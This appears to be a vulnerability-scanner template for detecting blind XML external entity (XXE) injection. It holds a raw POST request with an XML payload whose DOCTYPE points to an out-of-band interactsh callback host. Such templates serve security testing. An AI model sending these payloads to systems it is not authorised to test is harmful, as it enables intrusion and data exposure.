id: generic-blind-xxe
info:
  name: Generic Blind XXE
  author: geeknik
  severity: high
  description: This template detects Generic Blind XXE.
  classification:
    cwe-id:
      - CWE-611
  metadata:
    runzero-review: REJECT/2025-11-07/uses interactsh
    max-request: 1
  tags: blind,generic,vuln,xxe
http:
  - matchers:
      - part: interactsh_protocol
        type: word
        words:
          - http
    raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Referer: {{BaseURL}}

        <?xml version="1.0"?>
        <!DOCTYPE foo SYSTEM "http://{{interactsh-url}}">
        <foo>&e1;</foo>
